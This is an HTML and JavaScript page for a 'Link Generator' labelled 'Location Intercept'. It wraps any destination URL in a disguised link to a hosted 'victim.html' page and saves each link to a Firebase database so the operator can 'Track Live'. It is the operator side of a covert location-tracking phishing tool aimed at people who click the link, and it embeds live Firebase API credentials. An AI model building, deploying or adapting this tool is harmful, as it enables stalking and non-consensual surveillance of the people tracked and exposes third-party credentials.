<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Generator | CyberCore</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .cyber-card { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border: 1px solid #f0f0f0; }
        .animate-in { animation: fadeIn 0.5s ease forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen p-4 flex flex-col items-center">

    <div class="w-full max-w-2xl mb-6 flex items-center justify-between">
        <button onclick="location.href='dashboard.html'" class="bg-white p-3 rounded-2xl shadow-sm hover:text-green-600 transition">
            <i class="fa-solid fa-chevron-left"></i>
        </button>
        <h1 class="text-xl font-black text-gray-800 italic uppercase tracking-tighter">Link <span class="text-green-600">Generator</span></h1>
        <div class="w-10"></div>
    </div>

    <div class="cyber-card w-full max-w-2xl rounded-[2.5rem] shadow-2xl overflow-hidden mb-8">
        <div class="bg-gray-900 p-8 text-center text-white">
            <p class="text-[10px] font-black text-green-500 tracking-[0.3em] uppercase mb-2">Protocol: Location Intercept</p>
            <h2 class="text-lg font-bold">Generate Encrypted Link</h2>
        </div>

        <div class="p-8 space-y-6">
            <div>
                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2 ml-1">Destination URL</label>
                <input type="text" id="redirectUrl" placeholder="https://www.youtube.com/watch?v=..." 
                       class="w-full p-4 bg-gray-50 border border-gray-200 rounded-2xl outline-none focus:border-green-500 transition-all text-sm">
            </div>

            <button onclick="generateAndSave()" class="w-full bg-gray-900 text-white font-black py-4 rounded-2xl hover:bg-black transition-all uppercase tracking-widest text-sm shadow-xl active:scale-95">
                Generate & Save Link
            </button>

            <div id="resultBox" class="hidden space-y-4 pt-4 border-t border-dashed border-gray-200 animate-in">
                <div class="p-5 bg-green-50 rounded-3xl border-2 border-dashed border-green-200 relative">
                    <p class="text-[10px] font-black text-green-600 mb-2 uppercase">Your Tracking Link:</p>
                    <p id="finalLink" class="text-xs font-mono font-bold text-gray-700 break-all pr-10">--</p>
                    <button onclick="copyToClipboard()" class="absolute right-4 top-10 text-green-600 hover:scale-110">
                        <i class="fa-solid fa-copy text-xl"></i>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="w-full max-w-2xl bg-white rounded-[2.5rem] shadow-sm border border-gray-100 overflow-hidden mb-10">
        <div class="p-6 border-b border-gray-50 bg-gray-50/50 flex justify-between items-center">
            <h3 class="font-black text-xs uppercase text-gray-800">Recent Link Transactions</h3>
        </div>
        <div class="overflow-x-auto">
            <table class="w-full text-left text-xs">
                <thead class="bg-gray-50 text-gray-400 font-bold uppercase border-b">
                    <tr>
                        <th class="p-4">Timestamp</th>
                        <th class="p-4">Unique ID</th>
                        <th class="p-4">Action</th>
                    </tr>
                </thead>
                <tbody id="historyBody" class="font-bold text-gray-600">
                    </tbody>
            </table>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAfrFpzw2UddAxGrhAlIeP_c1OaoIG6wNk",
            authDomain: "in-app-update-21c61.firebaseapp.com",
            databaseURL: "https://in-app-update-21c61-default-rtdb.firebaseio.com",
            projectId: "in-app-update-21c61",
            storageBucket: "in-app-update-21c61.firebasestorage.app",
            messagingSenderId: "1013483026768",
            appId: "1:1013483026768:web:c5f54060842f9672431455"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const userMobile = localStorage.getItem("loggedInUser");

        // --- Generate & Save Logic ---
        function generateAndSave() {
            const redirect = document.getElementById('redirectUrl').value;
            if(!redirect.startsWith('http')) return alert("Enter valid URL");

            const githubPage = "https://sufih4x-rgb.github.io/cybersecurity/victim.html";
            const encodedRedirect = btoa(redirect);
            const trackingLink = `${githubPage}?id=${userMobile}&r=${encodedRedirect}`;

            // Save to Firebase History
            const newRef = db.ref('users/' + userMobile + '/linkHistory').push();
            newRef.set({
                timestamp: new Date().toLocaleString(),
                url: trackingLink,
                dest: redirect
            });

            document.getElementById('finalLink').innerText = trackingLink;
            document.getElementById('resultBox').classList.remove('hidden');
        }

        // --- Load History Logic ---
        function loadHistory() {
            db.ref('users/' + userMobile + '/linkHistory').on('value', snap => {
                const body = document.getElementById('historyBody');
                body.innerHTML = "";
                snap.forEach(child => {
                    const data = child.val();
                    const row = `
                        <tr class="border-b border-gray-50 hover:bg-gray-50">
                            <td class="p-4 text-gray-400">${data.timestamp}</td>
                            <td class="p-4 text-blue-600 font-mono">${child.key}</td>
                            <td class="p-4">
                                <button onclick="trackNow('${child.key}')" class="bg-green-100 text-green-700 px-3 py-1 rounded-lg hover:bg-green-200">
                                    Track Live
                                </button>
                            </td>
                        </tr>`;
                    body.insertAdjacentHTML('afterbegin', row);
                });
            });
        }

        function trackNow(id) {
            // Direct tracking page par bhej raha hai with ID
            location.href = `tracking.html?target=${id}`;
        }

        function copyToClipboard() {
            const text = document.getElementById('finalLink').innerText;
            navigator.clipboard.writeText(text);
            alert("Copied!");
        }

        window.onload = loadHistory;
    </script>
</body>
</html>
